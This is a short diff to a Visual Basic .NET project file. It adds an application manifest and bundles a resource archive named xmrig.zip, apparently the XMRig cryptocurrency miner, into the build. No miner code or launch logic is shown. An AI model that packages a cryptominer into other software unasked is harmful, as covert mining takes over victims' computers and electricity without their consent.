@@ -91,6 +91,9 @@
     <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
   <PropertyGroup />
+  <PropertyGroup>
+    <ApplicationManifest>My Project\app.manifest</ApplicationManifest>
+  </PropertyGroup>
   <ItemGroup>
     <Reference Include="Microsoft.VisualBasic.Compatibility" />
     <Reference Include="System" />
@@ -150,6 +153,7 @@
     <Compile Include="Theme.vb">
       <SubType>Component</SubType>
     </Compile>
+    <None Include="Resources\xmrig.zip" />
   </ItemGroup>
   <ItemGroup>
     <EmbeddedResource Include="Form1.resx">
